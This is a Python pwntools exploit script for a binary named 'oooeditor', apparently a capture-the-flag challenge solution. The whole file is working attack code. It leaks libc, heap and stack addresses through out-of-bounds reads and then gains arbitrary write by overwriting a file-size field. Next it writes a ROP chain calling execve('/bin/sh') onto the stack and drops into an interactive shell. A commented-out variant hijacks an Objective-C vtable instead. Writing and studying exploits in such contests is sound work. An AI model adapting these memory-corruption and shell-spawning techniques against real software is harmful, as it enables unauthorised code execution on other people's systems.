from pwn import *
import time

e = ELF('./oooeditor')
libc = e.libc
libc = ELF('./libc.so.6')
context.arch = 'amd64'
#context.log_level = 'debug'

def _open(name):
    r.sendlineafter(']> ', 'o '+name)
def _write_byte(offset, b):
    r.sendlineafter(']> ', 'w {} @ {}'.format(b, offset))
def _seek(offset):
    r.sendlineafter(']> ', 's {}'.format(offset))
def _format():
    r.sendlineafter(']> ', 'f')
def _write_word(offset, word):
    count = 0
    while count < 8:
        byte = word&0xff
        word = word >> 8
        _write_byte(offset+count, byte)
        count += 1
def _print(offset, l):
    r.sendlineafter(']> ', 'p {} @ {}'.format(l, offset))
    glob = r.recvuntil(']> ').splitlines()[:-1]
    result = []
    for line in glob:
        data = line.split('|')[0].strip().replace(' ', '').decode('hex')
        result.append(u64(data[:8]))
        result.append(u64(data[8:]))
    r.sendline()
    return result

# init
scan_offset = 4000
file_contents = 0x0000000000604608
file_size = 0x604650
cache = 0x0000000000604618
prdi = libc.search(asm('pop rdi;ret')).next()
prdx = libc.search(asm('pop rdx;ret')).next()
prsi = libc.search(asm('pop rsi;ret')).next()
syscall = libc.search(asm('syscall')).next()
sh = libc.search('/bin/sh\x00').next()
execve = libc.symbols['execve']

#init
os.environ['LD_LIBRARY_PATH'] = '.'
#os.environ['LD_PRELOADA'] = './libgnustep-base.so.1.25.1'
r = process('./oooeditor')

# open a file
_open('a.png')

# looking for debug info locate on heap
for i1 in range(scan_offset, 10000):
	content = _print(-0x100*i1, 0x100)
	if 0x652d67706762696c in content:
		j1 = content.index(0x652d67706762696c)
		if content[j1+1] == 0x00000000726f7272 and content[j1-1] == 0:
			print i1, j1
			break
# leak libc
libc_base = content[j1-2]-0x00007ffff716e1d0+0x00007ffff6fb3000
log.info('libc_base: %#x' % libc_base)

# looking for debug info located on heap
for i2 in range(scan_offset, 10000):
	content = _print(-0x100*i2, 0x100)
	if 0x0000736c74756e67 in content:
		j2 = content.index(0x0000736c74756e67)
		if content[j2-1] == 0:
			print i2, j2
			break
# leak heap
file_start = content[j2-3]+0x18+i1*0x100-j1*8
log.info('file_start: %#x' % file_start)

# leak stack
environ = libc.symbols['environ'] + libc_base
stack_ptr = [x for x in _print(environ-file_start, 0x10)][0]
log.info('stack_ptr: %#x' % stack_ptr)

_write_word(file_size-file_start, 0x7fffffffffffffff)

def success1():
	# locate return address
	offset = [x for x in _print(stack_ptr-file_start-0x1000, 0x1000)].index(0x0000000000401157)*8
	target = stack_ptr-0x1000+offset# need to be modified to last byte to become 0x00000000004011D9#ret
	buf = target + 8
	
	# prepare rop chain
	rop = []
	rop += [prdi+libc_base, sh+libc_base]
	rop += [prsi+libc_base, 0]
	rop += [prdx+libc_base, 0]
	rop += [execve+libc_base]
	for idx,x in enumerate(rop):
	    _write_word(buf+8*idx-file_start, x)

	# trigger
	_write_byte(target-file_start, 0xd9)
success1()

#def success2():
#	# locate cache object address
#	cache_addr = _print(cache-file_start, 0x10)[0]
#	log.info('cached object address: %#x' % cache_addr)
#	
#	# overwrite vtable that being called by getValue
#	system = libc_base + libc.symbols['system']
#	magic = libc_base + 0x4f322
#	_format()
#	_seek(1)
#        # well, this part is dirty, but it is my practice to know how objc works
#        # you can just overwrite cache and create a fake function table
#	object_array = _print(cache_addr+0x8-file_start, 0x10)[0]
#	object_addr = _print(object_array-file_start, 0x10)[0]
#	object_table = _print(object_addr-file_start, 0x10)[0]
#	object_func_table_addr = _print(object_table+0x40-file_start, 0x10)[0]
#	object_func_table = _print(object_func_table_addr-file_start, 0x10)[0]
#        func_ptr = object_func_table + 0x6c6538 - 0x6c5f70
#	_write_word(func_ptr-file_start, magic)
#	_format()
#success2()

r.interactive()
